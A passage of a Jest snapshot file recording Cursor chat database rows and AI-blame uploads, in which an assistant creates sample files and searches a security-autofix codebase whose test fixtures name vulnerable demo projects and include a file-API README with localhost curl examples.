import FileFixType\\\\nfrom pycommon.report.issue import Issue\\\\nfrom pycommon.run_task import process_objects_in_parallel\\\\nfrom pycommon.s3 import S3Access\\\\n\\\\nfrom patchino.config import (\\\\n    AWS_S3_ACCESS_KEY_ID,\\\\n    AWS_S3_ENDPOINT,\\",\\"numCharactersInRequestedRange\\":864,\\"offsetIsBiggerThanNumberOfLinesInFile\\":false,\\"totalLinesInFile\\":427}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-48 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:09ceaf85-752d-470a-b853-b4524a17dd8c",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"09ceaf85-752d-470a-b853-b4524a17dd8c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:23.834Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"0bc9633d-1054-4377-9c25-77913cfd26a5","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623","capabilityType":30,"thinking":{"text":"","signature":"8_yexe5s50SjyQXx82nkEBgHTjc3kkaFPRtjxofM0ddZwMWnaeIFJ_HUGMgv4ASq4fypyHmnNyuxen-AA2nT1mC-QnyKOiyHP5KaKlix96ZTh93C9lv2-7pKnC392bwmp2KeI6B_0T6Y4dRjy4eCqzaonttzzjCpkSLb_Fv9KXWzwuN0GRdbIpodh6gZ-wTV-Wca9s6Kx7M54mJHp9MjkVzpy7KSocJLglOH6iWrNvtdkKbzoy5evPR_6sqbte1LvNSqpYhQ8UEPYODUN2bBB6U8eRRx_QkU3UTIQY6FCeS5N58IyoBwcyX7GFxwmeWzUfQjwKttfGLzw72ZlslYwMqtNA39GCBvlyN1eUbhwosGrMSrd6GEv1pQnKUHLlLP2s8OGIKmvyckCB07T9G-yEilwK8yaMlapKiK4sYgoV2D4U1_hrd7drJr1NYn058b1zmGZAdAtf6mopOY4PzoFy8UFqxyqU2tOt9mqq9igIGfEKECDnyrIDhELhgX03ccUsBsgVGkQ4QL3cqftFmRT08ahtRHyp8MM8q9mKZDHof5-f_wAXSJaWvEImWBmC3z5nQTqu9EKa4QOYdp5y-2omyLgQS9skEI5G2atq-XrP2MIT9vxDbjwnr2dsR6YGqJbNgfHzNr--caaVb2MOAVmktmNN-2SUOVZaVCXVeh8ROG0x4MD35Ut1i6u0-M2Ujn6Mvx9bajJItR9pnI_zjTC5VGQKevx5b4lcFNM5TMul1-6n_nmVmerYdsS6CmmQeWO8E4StVvs8F4CsIjBPSxDrkzBCMVAueJov4TMFgy0KrKUU5uc9-noDhdnIZl92WDXz3PeXop3gIUJXh4IrVamam2A-p9c7jzlxXZrxcRpGN6FryuMEAYmVWch2Yx2ouUEus7vc_Gh0ZUDjhLbbl8opehCipbGd6Y6Mn1E2VDpzlvM7wGEWNb8QTf6FClzLKOU_625b9Lm7z8cF9AeamddAD51mg0STunYNaWjS7Oq1fRqWgFYxShRrYS"},"thinkingDurationMs":3768}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-49 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:f1c8cb8a-bad0-402b-ab2a-951c4f67c5cd",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"f1c8cb8a-bad0-402b-ab2a-951c4f67c5cd","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:37.192Z","isQuickSearchQuery":false,"text":"Moving the sample files to the repo root and updating code references. Copying files first:\\n","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-uploadAiBlame-call-0 1`] = `
[
  {
    "blameType": "CHAT",
    "inference": "This is a sample file.
You can use this as a template or example.",
    "model": "default",
    "prompts": [
      {
        "attachedFiles": [],
        "date": 2025-10-29T10:58:04.270Z,
        "text": "let's create a smaple file in the root of the repo",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T10:58:08.822Z,
        "text": "Checking the repo root, then creating a sample file.
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T10:58:08.916Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "list_dir",
          "parameters": "{"targetDirectory":"/Users/jonathanafek/src/autofixer"}",
          "rawArguments": "{"target_directory": "/Users/jonathanafek/src/autofixer"}",
          "result": "{"directoryTreeRoot":{"absPath":"/Users/jonathanafek/src/autofixer","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/build"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/fixtures"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/graphql"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/helpers"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/node_modules"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/pages"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/playwright-report"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/settings"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/test-results"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/tests"}],"childrenFiles":[{"name":"generated.ts"},{"name":"graphql.config.ts"},{"name":"package.json"},{"name":"playwright.config.ts"},{"name":"precommit-format.sh"},{"name":"tsconfig.json"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/build"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/constants"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/files"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/graphql"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/helpers"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/node_modules"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/settings"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/setup"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/tests"}],"childrenFiles":[{"name":"generated.ts"},{"name":"graphql.config.ts"},{"name":"index.d.ts"},{"name":"jest.config.ts"},{"name":"package.json"},{"name":"precommit-format.sh"},{"name":"tsconfig.json"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/build","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/build/litellm"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/clients","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/clients/cli"},{"absPath":"/Users/jonathanafek/src/autofixer/clients/copilot_ext"},{"absPath":"/Users/jonathanafek/src/autofixer/clients/cursor_ext"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/consumers","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/consumers/analyzer"},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/blame_ai_agent"},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/maintenance_service"},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/notifier"},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/report_init"},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/sast_report_parser"},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/scan_agent"},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/scm_agent"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/data_migrations","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/data_migrations/node_modules"}],"childrenFiles":[{"name":"package.json"},{"name":"tsconfig.json"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/dist","childrenFiles":[{"name":"litellm"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/docs","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/docs/cheat_sheets"}],"childrenFiles":[{"name":"auth.md"},{"name":"system.md"},{"name":"system.png"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/downloads"},{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure/pulumi"},{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure/web-workers"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/migrations","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/migrations/default"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/grafana"},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/postgres"},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/postgres-exporter"},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/prometheus"}],"childrenFiles":[{"name":"README.md"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/node_modules"},{"absPath":"/Users/jonathanafek/src/autofixer/patchino"},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon"},{"absPath":"/Users/jonathanafek/src/autofixer/scripts"},{"absPath":"/Users/jonathanafek/src/autofixer/services"},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon"}],"childrenFiles":[{"name":"CLAUDE.md"},{"name":"cspell.json"},{"name":"docker-bake-gha-cache.hcl"},{"name":"docker-compose.yml"},{"name":"Makefile"},{"name":"mypy_ext.ini"},{"name":"mypy.ini"},{"name":"package.json"},{"name":"pnpm-lock.yaml"},{"name":"pnpm-workspace.yaml"},{"name":"pom.xml"},{"name":"readme.md"},{"name":"sample-file.txt"},{"name":"sample.txt"},{"name":"sample2.txt"},{"name":"static-analysis.datadog.yml"}],"childrenWereProcessed":true}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T10:58:13.110Z,
        "text": "Creating a sample file in the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T10:58:13.176Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample.txt"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample.txt", "contents": "This is a sample file.\\nYou can use this as a template or example.\\n"}",
          "result": "{"diff":{"chunks":[{"diffString":"- This is a small text file created in the root of the repository.\\n- \\n+ This is a sample file.\\n+ You can use this as a template or example.\\n  ","oldStart":1,"newStart":1,"oldLines":3,"newLines":3,"linesRemoved":2,"linesAdded":2}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample.txt."}",
        },
        "type": "TOOL_EXECUTION",
      },
    ],
    "responseTime": "2025-10-29T10:58:13.176Z",
    "tool": "Cursor",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-uploadAiBlame-call-1 1`] = `
[
  {
    "blameType": "CHAT",
    "inference": "#!/usr/bin/env python3
"""
Final random file - Python script with random utilities
"""

import random
import string
from datetime import datetime
from typing import List, Dict


def generate_random_string(length: int = 10) -> str:
    """Generate a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_random_numbers(count: int = 5) -> List[int]:
    """Generate a list of random numbers."""
    return [random.randint(1, 100) for _ in range(count)]


def generate_random_data() -> Dict:
    """Generate a dictionary with random data."""
    return {
        'timestamp': datetime.now().isoformat(),
        'random_id': generate_random_string(8),
        'numbers': generate_random_numbers(7),
        'boolean': random.choice([True, False]),
        'float': round(random.uniform(0.0, 100.0), 2),
    }


def main():
    """Main function to demonstrate random utilities."""
    print("Random File Generator")
    print("=" * 40)
    
    data = generate_random_data()
    print(f"Generated Data: {data}")
    
    print(f"\\nRandom String: {generate_random_string(12)}")
    print(f"Random Numbers: {generate_random_numbers(10)}")
    print(f"Random Choice: {random.choice(['apple', 'banana', 'cherry', 'date'])}")


if __name__ == "__main__":
    main()",
    "model": "default",
    "prompts": [
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:45.917Z,
        "text": "please put sample files in the repo root",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.204Z,
        "text": "Searching the codebase for existing sample files and checking what should be placed in the repo root.
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.735Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "codebase_search",
          "parameters": "{"repositoryInfo":{"relativeWorkspacePath":".","repoName":"7297bde4-6c3c-4b5f-9f31-a615fa663f72","repoOwner":"google-oauth2|user_01JMHPT9B3D4A66MBMWNRKH8QX","orthogonalTransformSeed":3253139624173949,"preferredEmbeddingModel":"EMBEDDING_MODEL_UNSPECIFIED"},"query":"sample files examples","topK":15,"explanation":"","codeResults":[{"codeBlock":{"relativeWorkspacePath":"__tests__/constants/constants.ts","range":{"startPosition":{"line":61,"column":2},"endPosition":{"line":101,"column":19}},"signatures":{}},"score":0.32742080092430115},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":81,"column":1}},"signatures":{}},"score":0.31596270203590393},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/generator/prompt_files/markdown_system_prompt.txt","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":45,"column":1}},"signatures":{}},"score":0.3146929144859314},{"codeBlock":{"relativeWorkspacePath":"services/node_general_backend/src/maintenance/try_now.ts","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":40,"column":5}},"signatures":{}},"score":0.3024810552597046},{"codeBlock":{"relativeWorkspacePath":"patchino/ai-playground/src/components/mock.ts","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":333,"column":1}},"signatures":{}},"score":0.29074323177337646},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/README.md","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":45,"column":1}},"signatures":{}},"score":0.2902885973453522},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md","range":{"startPosition":{"line":81,"column":1},"endPosition":{"line":160,"column":1}},"signatures":{}},"score":0.288938045501709},{"codeBlock":{"relativeWorkspacePath":"clients/cli/__tests__/mcp/fileUtils.unit.test.ts","range":{"startPosition":{"line":210,"column":7},"endPosition":{"line":282,"column":28}},"signatures":{"ranges":[{"startPosition":{"line":19,"column":1},"endPosition":{"line":19,"column":1}},{"startPosition":{"line":19,"column":23},"endPosition":{"line":20,"column":3}},{"startPosition":{"line":31,"column":3},"endPosition":{"line":31,"column":3}},{"startPosition":{"line":31,"column":34},"endPosition":{"line":32,"column":5}}]}},"score":0.2807697057723999},{"codeBlock":{"relativeWorkspacePath":"services/app/src/components/Analysis/collapsible/GenerateAIRule.tsx","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":37,"column":78}},"signatures":{}},"score":0.28029704093933105},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":240,"column":20},"endPosition":{"line":268,"column":18}},"signatures":{}},"score":0.2794812321662903},{"codeBlock":{"relativeWorkspacePath":"clients/cli/__tests__/mcp/helpers/MockRepo.ts","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":61,"column":4}},"signatures":{}},"score":0.27924689650535583},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/generator/templates/vulnerability_template.md.txt","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":63,"column":1}},"signatures":{}},"score":0.2715897858142853},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/python/wildcard_imports/README.md","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":49,"column":1}},"signatures":{}},"score":0.2711057662963867},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/sqli/e-1578/source/README.md","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":68,"column":1}},"signatures":{}},"score":0.2711007595062256},{"codeBlock":{"relativeWorkspacePath":"pycommon/tests/conftest.py","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":42,"column":22}},"signatures":{}},"score":0.2702752351760864}]}",
          "rawArguments": "{"query": "sample files examples", "target_directories": []}",
          "result": "{"codeResults":[{"codeBlock":{"relativeWorkspacePath":"__tests__/constants/constants.ts","range":{"startPosition":{"line":55},"endPosition":{"line":232,"column":1}},"contents":"\\n\\nexport const CONSTANTS = {\\n  DATA: {\\n    EMPTY: {\\n      UPLOAD_FILE: {\\n        SEMGREP: getUploadFile('files/empty/semgrep.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n      REPO_ARCHIVE: getUploadFile('files/empty/repo.zip'),\\n    } as TestData,\\n    WEBGOAT_MINIMAL: {\\n      UPLOAD_FILE: {\\n        //filtered report leaving only 6 sqli findings with fixes that have conflicts\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx-minimal.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    } as TestData,\\n    WEBGOAT: {\\n      UPLOAD_FILE: {\\n        CODEQL: getUploadFile('files/webgoat/codeql.json'),\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx.json'),\\n        CHECKMARX_XML: getUploadFile('files/webgoat/checkmarx.xml'),\\n        SNYK: getUploadFile('files/webgoat/snyk.json'),\\n        FORTIFY: getUploadFile('files/webgoat/scandata.fpr'),\\n        SONARQUBE: getUploadFile('files/webgoat/sonarqube.json'),\\n      },\\n      GIT_REPO: 'https://github.com/WebGoat/WebGoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n      REPO_ARCHIVE: getUploadFile('files/webgoat/repo.zip'),\\n    } as TestData,\\n    MOBB_SVJP: {\\n      UPLOAD_FILE: {\\n        CHECKMARX: getUploadFile('files/svjp/checkmarx.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobb-dev/simple-vulnerable-java-project',\\n      REFERENCE: 'main',\\n      REPO_ARCHIVE: getUploadFile('files/svjp/repo.zip'),\\n    } as TestData,","originalContents":"\\n\\nexport const CONSTANTS = {\\n  DATA: {\\n    EMPTY: {\\n      UPLOAD_FILE: {\\n        SEMGREP: getUploadFile('files/empty/semgrep.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n      REPO_ARCHIVE: getUploadFile('files/empty/repo.zip'),\\n    } as TestData,\\n    WEBGOAT_MINIMAL: {\\n      UPLOAD_FILE: {\\n        //filtered report leaving only 6 sqli findings with fixes that have conflicts\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx-minimal.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    } as TestData,\\n    WEBGOAT: {\\n      UPLOAD_FILE: {\\n        CODEQL: getUploadFile('files/webgoat/codeql.json'),\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx.json'),\\n        CHECKMARX_XML: getUploadFile('files/webgoat/checkmarx.xml'),\\n        SNYK: getUploadFile('files/webgoat/snyk.json'),\\n        FORTIFY: getUploadFile('files/webgoat/scandata.fpr'),\\n        SONARQUBE: getUploadFile('files/webgoat/sonarqube.json'),\\n      },\\n      GIT_REPO: 'https://github.com/WebGoat/WebGoat',\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n      REPO_ARCHIVE: getUploadFile('files/webgoat/repo.zip'),\\n    } as TestData,\\n    MOBB_SVJP: {\\n      UPLOAD_FILE: {\\n        CHECKMARX: getUploadFile('files/svjp/checkmarx.json'),\\n      },\\n      GIT_REPO: 'https://github.com/mobb-dev/simple-vulnerable-java-project',\\n      REFERENCE: 'main',\\n      REPO_ARCHIVE: getUploadFile('files/svjp/repo.zip'),\\n    } as TestData,","detailedLines":[{"text":"export function getUploadFile(filename: string): UploadFile {","lineNumber":56,"isSignature":true},{"text":" fs.readFileSync(path.resolve(process.cwd(), filename)),","lineNumber":59},{"text":"  }","lineNumber":60},{"text":"}","lineNumber":61,"isSignature":true},{"lineNumber":62},{"text":"export const CONSTANTS = {","lineNumber":63},{"text":"  DATA: {","lineNumber":64},{"text":"    EMPTY: {","lineNumber":65},{"text":"      UPLOAD_FILE: {","lineNumber":66},{"text":"        SEMGREP: getUploadFile('files/empty/semgrep.json'),","lineNumber":67},{"text":"      },","lineNumber":68},{"text":"      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',","lineNumber":69},{"text":"      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":70},{"text":"      REPO_ARCHIVE: getUploadFile('files/empty/repo.zip'),","lineNumber":71},{"text":"    } as TestData,","lineNumber":72},{"text":"    WEBGOAT_MINIMAL: {","lineNumber":73},{"text":"      UPLOAD_FILE: {","lineNumber":74},{"text":"        //filtered report leaving only 6 sqli findings with fixes that have conflicts","lineNumber":75},{"text":"        CHECKMARX: getUploadFile('files/webgoat/checkmarx-minimal.json'),","lineNumber":76},{"text":"      },","lineNumber":77},{"text":"      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',","lineNumber":78},{"text":"      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":79},{"text":"    } as TestData,","lineNumber":80},{"text":"    WEBGOAT: {","lineNumber":81},{"text":"      UPLOAD_FILE: {","lineNumber":82},{"text":"        CODEQL: getUploadFile('files/webgoat/codeql.json'),","lineNumber":83},{"text":"        CHECKMARX: getUploadFile('files/webgoat/checkmarx.json'),","lineNumber":84},{"text":"        CHECKMARX_XML: getUploadFile('files/webgoat/checkmarx.xml'),","lineNumber":85},{"text":"        SNYK: getUploadFile('files/webgoat/snyk.json'),","lineNumber":86},{"text":"        FORTIFY: getUploadFile('files/webgoat/scandata.fpr'),","lineNumber":87},{"text":"        SONARQUBE: getUploadFile('files/webgoat/sonarqube.json'),","lineNumber":88},{"text":"      },","lineNumber":89},{"text":"      GIT_REPO: 'https://github.com/WebGoat/WebGoat',","lineNumber":90},{"text":"      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":91},{"text":"      REPO_ARCHIVE: getUploadFile('files/webgoat/repo.zip'),","lineNumber":92},{"text":"    } as TestData,","lineNumber":93},{"text":"    MOBB_SVJP: {","lineNumber":94},{"text":"      UPLOAD_FILE: {","lineNumber":95},{"text":"        CHECKMARX: getUploadFile('files/svjp/checkmarx.json'),","lineNumber":96},{"text":"      },","lineNumber":97},{"text":"      GIT_REPO: 'https://github.com/mobb-dev/simple-vulnerable-java-project',","lineNumber":98},{"text":"      REFERENCE: 'main',","lineNumber":99},{"text":"      REPO_ARCHIVE: getUploadFile('files/svjp/repo.zip'),","lineNumber":100},{"text":"    } as TestData,","lineNumber":101},{"text":"    ALTOROJ: {","lineNumber":102},{"text":"      UPLOAD_FILE:","lineNumber":103},{"text":",","lineNumber":232},{"text":"}","lineNumber":233}]},"score":0.32742080092430115},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md","range":{"startPosition":{},"endPosition":{"line":82}},"contents":"# File Upload/Download REST API\\n\\nA simple Java REST API built with Spring Boot that allows users to upload files and download them later.\\n\\n## Features\\n\\n- **File Upload**: Upload files with automatic unique filename generation\\n- **File Download**: Download files by filename\\n- **File Listing**: List all uploaded files\\n- **File Deletion**: Delete files by filename\\n- **File Information**: Get file metadata (size, last modified)\\n- **Web Interface**: Simple HTML interface for testing the API\\n\\n## Prerequisites\\n\\n- Java 17 or higher\\n- Maven 3.6 or higher\\n\\n## Quick Start\\n\\n### 1. Build the Application\\n\\n\`\`\`bash\\nmvn clean install\\n\`\`\`\\n\\n### 2. Run the Application\\n\\n\`\`\`bash\\nmvn spring-boot:run\\n\`\`\`\\n\\nThe application will start on \`http://localhost:8080\`\\n\\n### 3. Access the Web Interface\\n\\nOpen your browser and navigate to \`http://localhost:8080\` to access the web interface for testing the API.\\n\\n## API Endpoints\\n\\n### Upload File\\n- **URL**: \`POST /api/files/upload\`\\n- **Content-Type**: \`multipart/form-data\`\\n- **Parameter**: \`file\` (the file to upload)\\n- **Response**: JSON with success message and generated filename\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -X POST -F \\"file=@/path/to/your/file.txt\\" http://localhost:8080/api/files/upload\\n\`\`\`\\n\\n### Download File\\n- **URL**: \`GET /api/files/download?filename={filename}\`\\n- **Response**: File download with appropriate headers\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -O -J \\"http://localhost:8080/api/files/download?filename={filename}\\"\\n\`\`\`\\n\\n### List Files\\n- **URL**: \`GET /api/files/list\`\\n- **Response**: JSON with list of all uploaded files\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl http://localhost:8080/api/files/list\\n\`\`\`\\n\\n### Delete File\\n- **URL**: \`DELETE /api/files/delete?filename={filename}\`\\n- **Response**: JSON with success message\\n\\n**Example using curl:**\\n\`\`\`bash\\ncurl -X DELETE \\"http://localhost:8080/api/files/delete?filename={filename}\\"\\n\`\`\`\\n\\n### Get File Information\\n- **URL**: \`GET /api/files/info?filename={filename}\`\\n","originalContents":"# File Upload/Download REST API\\n\\nA simple Java REST API built with Spring Boot that allows users to upload files and download them later.\\n\\n## Features\\n\\n- **File Upload**: Upload files with automatic unique filename generation\\n- **File Download**: Download files by filename\\n- **File Listing**: List all uploaded files\\n- **File Deletion**: Delete files by filename\\n- **File Information**: Get file metadata (size, last modified)\\n- **Web Interface**: Simple HTML interface for testing the 